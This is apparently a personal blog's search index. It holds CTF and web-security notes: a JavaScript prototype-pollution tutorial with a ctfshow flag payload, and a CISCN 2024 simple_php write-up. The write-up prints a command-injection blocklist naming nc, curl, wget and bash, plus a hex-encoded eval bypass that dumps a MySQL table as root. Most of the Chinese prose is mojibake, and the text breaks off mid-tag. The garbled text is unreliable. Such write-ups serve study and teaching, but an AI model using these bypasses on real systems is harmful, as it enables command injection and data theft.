<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>phpä»£ç å®¡è®¡åˆæ¢ï¼Œfastadminä»£ç å®¡è®¡è®°å½•</title>
      <link href="/2024/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E6%8E%A2%EF%BC%8Cfastadmin%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E6%8E%A2%EF%BC%8Cfastadmin%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3ac61bc65c9b987a2185f475c3d428729b1b0f30af7dceed9faf462466cf4445">612c4be5af9d151fcef04674f16b7b1198a220535dec485ecb4a46c76ef283134b787e4d633a14fa3a86bcb4042e22650a3f6ef5848a81d084488b027fa723c8ee052c73360da8806b5c1eab58a2d3dbe0c156eebebc0a9da7e863f117a734fc642315a990bb0cd71bccaf781458e529295b0d5718b55aad779c9c54cb0017c157242c7e987de9a1aca3006fb1f90dafb6e9678c297218f6d79978e50dbb07e28f637f9dfcb5db738b427d7ca22c14d7f3b4c5b633ffd3a94ebe40fa5af7fa8f3ce94efa02eb649ed0017984d2cdc6a5a054bfaf0a48f25edfa22b8dc6223667133d5cb2eca4f70843077d806f4da457c801393f339cb76e1115998cde6658749c8c03ee96010fc9c5a4f37b76a9a2c754ae109b906ca803c62bf54fd7bed17a0c1f1e66d1171ab88522536540b40fa907dac2a61b450c2165215e88db1f490578c984054c029b672f3f08aba5b898df61df3ae47b3984e63cf9a866f2e822a02268e768378444e9a58faad26434ab647a70f6b02257646c671cf42bf85463346373c1218f03de22779f2322f4b9a538acf8e9a86d498ec186ae785028a6e04c7d29bf118e7a188588be406515e74955a1a5e088dd011c522332ec089680d1488f41f3f7f2b06f5be1d077322980a6a1295d572aa3e357af6d2cfcc962ff4aaf47465d00e8fe59b38df5507445ebcd5e225aa5797679ee554788cca4f3723c7d14f185ca7a7ac1e44ab6a2dc07d79763d6e3ba241173ec67f3f547f1f2af003ca570d0c3e025ed3c6da007af2ca36474c66d355ae1d10199bbea69136cb29e4a13353cec070b3092b62ae040ff5745476b3e2c98dc4dc285fef2289d2ea2297fe4c4a6bf69dfa07fabb301725c18375cddb6e7301da00096d2581c83f2181dde307be66f49a79b60ed3f6e6fd00385ae52e5112e669c23a6114ceea54b4e0d35e870e21ddd870a23f627c125ac04d611080267d694df7b6829855eb5180b47a0f4c65cf57b4f0238f518b5e58d3858122dbd8769fd84715dcb22b33e7027a2c5f694b7739c1216aa002eacb1f88b4f477b8cf3d3cf5fd8c675902af0b08999b1d8f755798305ae70d54d2a92c706d8a969bc77732e5cc504e4c22f2200861cff26c2a6da217364821220a985f76c204804060fcf441fe698999e24fee5b242aee86b4eafb82af4ab1ab41dffddbb56c0ee0ab983329374ab96d8d25a1b203830613a729261db4b73b9f2323d2502e59808a475a656c773fcde3e904245dc3f0f10c33b4de8699a8ce2533dd12b19138d0c489585aa77fd6708166bfd4ead92fde7323b77cf8e2aa0e5ee3d43e083f1c1e2d3fa7b8d29e9e7fc3650f2b4a0d5e53f0ed3dd2c13805f1078fc17eaa62868bbee27ea90977d36e46ed4ad029d71e6ca66fe0f05099909d3c7e55f06cf026dc409dd78780a149fdcc29dfe3817f24f24c6cbd478414adfc666a7359efbbf7129895552b31329e7852bd7826c10dfdd470e08df922c3829166a17cfade22870e2308fd676b7432a6434f93d8d22f5ee53cd3134e60d0aae1c792f9738adfb592d832205007fba703abecee8d58ccb5648e7027874b29eb6c0205dfe4cc837262d59cc56b3e9b1bd746d547739e1ed42160fb8a131bd13090dacf11b2a21c19f7fe111b67d1a0031e04ebc236c13c434102d4d5ed72f1f21ea2145977a1a437dee062365c77e9ccde25768b8716421f2d37b2b7f40693d66beb6b719b79941d42a8082643c3d1e7d12d75fcd466f55a6166a8412152103e7e88d091c9693d943707a4244eb0d3a85b3de4ae2b5c9bf0461ea54e62e0033391b22b59b90d4b02d627902caf8d16564a6651f0a7a6e75123c803607d9da76418c882091302ab4986281eaf49b30c0b78e2c483b7f72b5c2ef0251cf0129c68a4c14e3c148bf27137098108bf6813346a315cb8b9b3654d9c126a23adbfbe5a4f5b2b643de08aa978df4550393e4698865d9115e0f4f20ccd05ec4b61b1830df30ec004e0ab259ae0cfd860152ecf2ce1276f249b90364db</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JSC</title>
      <link href="/2024/10/16/JSC/"/>
      <url>/2024/10/16/JSC/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JSåŸå‹é“¾æ±¡æŸ“</title>
      <link href="/2024/10/12/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1/"/>
      <url>/2024/10/12/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1/</url>
      
        <content type="html"><![CDATA[<h1 id="jsåŸå‹é“¾æ±¡æŸ“"><a href="#jsåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="jsåŸå‹é“¾æ±¡æŸ“"></a>jsåŸå‹é“¾æ±¡æŸ“</h1><h2 id="ä»€ä¹ˆæ˜¯jsåŸå‹-prototype"><a href="#ä»€ä¹ˆæ˜¯jsåŸå‹-prototype" class="headerlink" title="ä»€ä¹ˆæ˜¯jsåŸå‹(prototype)"></a>ä»€ä¹ˆæ˜¯jsåŸå‹(prototype)</h2><p>è¦å¼„æ¸…è¿™ä¸ªé—®é¢˜ï¼Œå°±è¦å…ˆå¼„æ¸…ä»€ä¹ˆäº‹ç±»å’Œå¯¹è±¡ã€‚<br>ç±»å’Œå¯¹è±¡æ˜¯é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ä¸­çš„å‡ æœ¬æ¦‚å¿µã€‚è¿™é‡Œä¸è¿›è¡Œè¯¦ç»†é˜è¿°ï¼Œç®€å•çš„è¯´ï¼Œç±»å¯ä»¥å®ä¾‹åŒ–æˆä¸ºå¯¹è±¡ã€‚äºŒè€…å†…éƒ¨éƒ½å­˜åœ¨å±æ€§å’Œæ–¹æ³•ã€‚</p><p>ç°åœ¨æ¥è¯´åŸå‹ã€‚åŸå‹åˆ†ä¸ºæ˜¾å¼åŸå‹(prototype)å’Œéšå¼åŸå‹(_<em>proto_</em>)ã€‚ç°åœ¨å‡å®šæœ‰ä¸€ä¸ªç±»Fooå’Œä¸€ä¸ªFooç±»å®ä¾‹åŒ–å¾—å‡ºçš„å¯¹è±¡fooã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">FunctionName</span> = </span><br></pre></td></tr></table></figure><p>æ¥å®šä¹‰åŸå‹ã€‚å®Œæˆäº†å®šä¹‰åï¼Œå°±å¯ä»¥é€šè¿‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.<span class="title class_">FunctionName</span>();</span><br></pre></td></tr></table></figure><p>æ¥å¯¹å®šä¹‰å¥½çš„å‡½æ•°æ¥è¿›è¡Œè°ƒç”¨äº†ã€‚</p><p>è€Œ__proto__å’Œprototypeçš„å…³ç³»ä¸ºï¼šfoo.__proto__ &#x3D;&#x3D; Foo.prototype</p><p>æ€»çš„æ¥è¯´ï¼Œprototypeæ˜¯ç±»çš„ä¸€ä¸ªå±æ€§ï¼Œè€Œç”±è¯¥ç±»å®ä¾‹åŒ–å¾—åˆ°çš„å¯¹è±¡éƒ½ä¼šæ‹¥æœ‰prototypeçš„å±æ€§å’Œæ–¹æ³•ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯jsåŸå‹é“¾"><a href="#ä»€ä¹ˆæ˜¯jsåŸå‹é“¾" class="headerlink" title="ä»€ä¹ˆæ˜¯jsåŸå‹é“¾"></a>ä»€ä¹ˆæ˜¯jsåŸå‹é“¾</h2><p><img src="/images/yxl.png" alt="img1"></p><p>è¿™å¼ å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡ __proto__ å¯ä»¥ä¸€ç›´å¾€å‰æ‰¾å¯¹è±¡çš„åŸå‹ï¼Œå°±å½¢æˆäº†åŸå‹é“¾ã€‚</p><p>è€Œjsåœ¨å¯»æ‰¾å±æ€§æ—¶ï¼Œå¦‚æœåœ¨å½“å‰çš„å¯¹è±¡ä¸­æ‰¾ä¸åˆ°ï¼Œåˆ™ä¼šå»å¯¹è±¡çš„ __proto__ ä¸­å¯»æ‰¾ã€‚è¿™ä¸ªå¯»æ‰¾æœºåˆ¶å°±æ˜¯åŸå‹ç»§æ‰¿é“¾ã€‚</p><h2 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h2><p>å‰æ–‡ä¸­å·²ç»æåˆ°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è±¡çš„ __proto__ æ¥è®¿é—®ç±»çš„åŸå‹ã€‚é‚£ä¹ˆå¦‚æœæˆ‘é—¨ä¿®æ”¹ä¸€ä¸ªç±»çš„å¯¹è±¡çš„ __proto__ ï¼Œæ˜¯å¦å°±å¯ä»¥æ§åˆ¶è¯¥ç±»çš„å…¶ä»–å¯¹è±¡çš„å±æ€§äº†å‘¢</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;bar : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>);</span><br><span class="line"><span class="comment">//é€šè¿‡__proto__æ¥ä¿®æ”¹å±æ€§barçš„å€¼</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>);</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¿™æ®µä»£ç å¯ä»¥å‘ç°ï¼Œè™½ç„¶zooä¸ºä¸€ä¸ªç©ºå±æ€§ï¼Œä½†æ˜¯è¾“å‡ºå…¶barå±æ€§ä¼šå‘ç°ç»“æœä¸º2ã€‚è¿™å°±æ„å‘³ç€æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå¯¹è±¡æ¥ä¿®æ”¹åŸå‹é“¾ï¼Œä»è€Œå½±å“äº†å…¶ä»–çš„å¯¹è±¡çš„å±æ€§ã€‚è¿™å°±æ˜¯jsåŸå‹é“¾æ±¡æŸ“çš„åŸºæœ¬åŸç†ã€‚</p><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><h3 id="1-merge-x2F-copyå‡½æ•°"><a href="#1-merge-x2F-copyå‡½æ•°" class="headerlink" title="1.merge&#x2F;copyå‡½æ•°"></a>1.merge&#x2F;copyå‡½æ•°</h3><p>mergeå‡½æ•°åˆå¹¶ä¸¤ä¸ªå¯¹è±¡æ—¶ï¼Œå¯¹äºå±æ€§çš„å€¼æ—¶å¯¹è±¡æˆ–è€…æ•°ç»„çš„ï¼Œmergeä¼šæŠŠä»–ä»¬çš„å¼•ç”¨å¤åˆ¶ç»™ç›®æ ‡å¯¹è±¡ã€‚å› æ­¤ï¼Œåœ¨mergeå®Œæˆåï¼Œä¿®æ”¹æºå¯¹è±¡çš„å±æ€§ï¼Œç›®æ ‡å¯¹è±¡çš„å±æ€§ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ã€‚</p><p>è¿™é‡Œç”¨ctfshowçš„é¢˜ç›®åšä¾‹å­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯é¢˜ç›®ç™»é™†ç•Œé¢çš„æºç ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡ŒæŠŠreq.bodyä¹Ÿå°±æ˜¯ç”¨æˆ·çš„è¯·æ±‚å†…å®¹copyåˆ°äº†userä¸­ï¼Œè¿›è¡Œç™»é™†ã€‚ä½†æ˜¯åˆ©ç”¨åˆšæ‰çš„çŸ¥è¯†ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ª</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__proto__&quot;</span> : &#123;</span><br><span class="line"><span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥åšåˆ°å°±è¯¥secretçš„å¯¹è±¡çš„æ•ˆæœï¼Œä»è€Œå¾—åˆ°flagã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›çŸ¥è¯†ç‚¹</title>
      <link href="/2024/07/11/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2024/07/11/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„çŸ¥è¯†ç‚¹"><a href="#ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„çŸ¥è¯†ç‚¹" class="headerlink" title="ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„çŸ¥è¯†ç‚¹"></a>ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„çŸ¥è¯†ç‚¹</h1><h2 id="md5-str-true-æ¼æ´"><a href="#md5-str-true-æ¼æ´" class="headerlink" title="md5(str,true)æ¼æ´"></a>md5(str,true)æ¼æ´</h2><h2 id="print-r-global-â€œ-â€-éå†ç›®å½•"><a href="#print-r-global-â€œ-â€-éå†ç›®å½•" class="headerlink" title="print_r(global(â€œ*â€))éå†ç›®å½•"></a>print_r(global(â€œ*â€))éå†ç›®å½•</h2><h2 id="jså¤§å°å†™ç‰¹æ€§"><a href="#jså¤§å°å†™ç‰¹æ€§" class="headerlink" title="jså¤§å°å†™ç‰¹æ€§"></a>jså¤§å°å†™ç‰¹æ€§</h2><p>å­—ç¬¦â€Ä±â€ã€â€Å¿â€ ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º â€œIâ€ã€â€Sâ€</p><p>å­—ç¬¦â€â„ªâ€ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸ºâ€kâ€(è¿™ä¸ªâ„ªä¸æ˜¯K)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2024 ciscn ååŒ—èµ›åŒºåˆèµ›è¯•é¢˜å¤ç°</title>
      <link href="/2024/07/02/2024-ciscn-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%9D%E8%B5%9B%E8%AF%95%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/02/2024-ciscn-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%9D%E8%B5%9B%E8%AF%95%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2024CISCN-webæ–¹å‘é¢˜ç›®å¤ç°ä¸çŸ¥è¯†ç‚¹æ¢³ç†"><a href="#2024CISCN-webæ–¹å‘é¢˜ç›®å¤ç°ä¸çŸ¥è¯†ç‚¹æ¢³ç†" class="headerlink" title="2024CISCN webæ–¹å‘é¢˜ç›®å¤ç°ä¸çŸ¥è¯†ç‚¹æ¢³ç†"></a>2024CISCN webæ–¹å‘é¢˜ç›®å¤ç°ä¸çŸ¥è¯†ç‚¹æ¢³ç†</h1><h2 id="1-simple-php"><a href="#1-simple-php" class="headerlink" title="1.simple_php"></a>1.simple_php</h2><p>éå¸¸ç‹—çš„ä¸€é“é¢˜<br>å…ˆçœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡postæ–¹å¼ä¼ å…¥cmdå‚æ•°ä¸é¢˜ç›®ç¯å¢ƒäº¤äº’ã€‚<br>ä¼ å…¥çš„cmdè¢«å¥—äº†ä¸€å±‚<strong>escapeshellcmd</strong>å‡½æ•°åèµ‹å€¼ç»™cmdï¼Œæ¥ç€è¿›è¡Œä¸€ä¸ªé»‘åå•è¿‡æ»¤ã€‚éå¸¸å…¨é¢çš„ä¸€ä¸ªé»‘åå•â€¦å‡ ä¹æŠŠæ‰€æœ‰èƒ½ç”¨çš„éƒ½è¿‡æ»¤æ‰äº†ã€‚æœ€åæ‰§è¡Œcmdçš„å‘½ä»¤ã€‚</p><hr><p>å¾ˆç®€å•çš„ä»£ç é€»è¾‘ï¼Œéš¾å¤„åœ¨äºå¦‚ä½•ç»•è¿‡è¿™ä¸¤æ¬¡è¿‡æ»¤ã€‚<br>å…ˆæ¥çœ‹ç¬¬ä¸€å±‚è¿‡æ»¤ï¼šescapeshellcmd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellcmd</span>(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ã€‚è¿™æ˜¯ä¸€ä¸ªphpè‡ªå¸¦çš„é˜²æ­¢å‘½ä»¤æ³¨å…¥çš„å‡½æ•°ï¼Œphpæ–‡æ¡£å¯¹å…¶çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><blockquote><p>â€œåæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š&amp;#;&#96;|*?~&lt;&gt;^()[]{}$\ã€\x0A å’Œ \xFFã€‚ â€˜ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚â€</p></blockquote><p>è¿™ä¹Ÿå°±å¯¼è‡´è¿™é¢˜éš¾ä»¥é€šè¿‡ç‰¹æ®Šç¬¦å·ç›¸å…³çš„æ–¹æ³•æ¥ç»•è¿‡é»‘åå•ï¼Œæ¯”å¦‚äº¦æˆ–çš„æ— ç¬¦å·rceç­‰å¾…ã€‚</p><p>ä¸‹é¢çš„æ­£åˆ™åŒ¹é…å°±æ¯”è¾ƒç®€å•äº†ã€‚å°±æ˜¯å±è”½äº†ä¸€äº›å…³é”®å­—ã€‚ç›®å‰ç¬”è€…å‘ç°è¿˜èƒ½ç”¨çš„å‘½ä»¤æœ‰: man,diff,php,rev,paste,dd if&#x3D;</p><p>å…¶ä¸­é™¤äº†phpä»¥å¤–éƒ½åªèƒ½è¯»å–æ–‡ä»¶ï¼Œdiffå‘½ä»¤æ¯”è¾ƒå¥½ç”¨çš„ä¸€ç‚¹-ræ˜¯ä»–å¯ä»¥æ¯”è¾ƒå­ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚ä¸è¿‡æ¯”è¾ƒä¸€ç•ªä¹Ÿæ²¡æœ‰æ‰¾åˆ°ã€‚åªèƒ½è¯•ç€ç”¨phpå‘½ä»¤å»è¿æ¥æ•°æ®å¯è¯•è¯•äº†ã€‚è¿™é‡Œç»™å‡ºphpå‘½ä»¤çš„è§£é‡Šå’Œä½¿ç”¨æ–¹å¼ã€‚</p><pre><code>&gt;-r æ‰§è¡Œä»£ç ï¼Œæ— éœ€è„šæœ¬æ ‡è®° &gt;-f æ‰§è¡Œæ–‡ä»¶</code></pre><p>ä¸ªäººæ„Ÿè§‰æ¯”è¾ƒå¸¸ç”¨çš„ä»¥ä¸Šä¸¤ä¸ªé€‰é¡¹ã€‚è¿™é‡Œå¯ä»¥ç”¨php -ræ¥æ‰§è¡Œä»£ç ã€‚<br>æµ‹è¯•php -r phpinfo();å‘ç°å¯ä»¥è·‘é€š</p><p><img src="/images/img_simphp.png" alt="img1"></p><p>ä½†æ˜¯å¦‚æœä½¿ç”¨systemæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿˜æ˜¯ä¼šè¢«ä¸Šé¢çš„é»‘åå•è¿‡æ»¤ï¼Œ(ç”šè‡³è¿å¼•å·éƒ½è¿‡æ»¤æ‰äº†)å› æ­¤ä½¿ç”¨hex2binå‡½æ•°æ¥è¿›è¡Œç»•è¿‡ã€‚hex2binå¯ä»¥æŠŠè¾“å…¥çš„åå…­è¿›åˆ¶asciiç è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚è¿™é‡Œå…ˆç»™å‡ºpayloadå†åšè§£é‡Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_hex,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure><p>evalå°±ä¸åšè§£é‡Šäº†ã€‚è¿™é‡Œä¸»è¦è§£é‡Šä¸ºä»€ä¹ˆhex2biné‡Œé¢è¦å¥—ä¸€ä¸ªsubstrã€‚substr()å‡½æ•°è¾“å…¥ä¸‰ä¸ªå‚æ•°ï¼šstring,start,lengthã€‚åˆ†åˆ«æ˜¯å¾…å¤„ç†çš„å­—ç¬¦ä¸²ï¼Œå¼€å§‹ä½ç½®ï¼Œæˆªå–é•¿åº¦ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥ç¼ºçœï¼Œå³è¾“å‡ºä»å¼€å§‹ä½ç½®åˆ°ç»“æŸçš„æ‰€æœ‰å­—ç¬¦ä¸²ã€‚</p><p>è¿™é‡Œè°ƒç”¨è¿™ä¸ªå‡½æ•°çš„ä¸»è¦ç›®çš„æ˜¯ï¼šåœ¨æ²¡æœ‰ä½†åŒå¼•å·çš„æƒ…å†µä¸‹ï¼Œæ„é€ å­—ç¬¦ä¸²ã€‚å› ä¸ºhex2binçš„è¾“å…¥è¦æ±‚æ˜¯å¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ï¼Œä½†è¿™é‡ŒæŠŠå¼•å·banäº†ï¼Œå°±è¦ç”¨åˆ°substräº†ã€‚substrå…è®¸è¾“å…¥æ²¡æœ‰å¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚è¿™ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å€Ÿç”¨substræ¥å®ç°æ— å¼•å·å­—ç¬¦ä¸²çš„æ„å»ºã€‚æµ‹è¯•ä¸€ä¸‹whoamiï¼Œå‘ç°æ­£å¸¸å›æ˜¾ï¼Œå‘¢ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æ— èŠçš„æŸ¥åº“æ—¶é—´äº†ã€‚</p><p><img src="/images/simphp_test.png" alt="img1"></p><p>è¿™ä¸ªåœ°æ–¹æ²¡å•¥æŠ€æœ¯å«é‡ï¼Œç›´æ¥ç»™å‡ºæœ€ç»ˆpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r <span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure><h2 id="easycms"><a href="#easycms" class="headerlink" 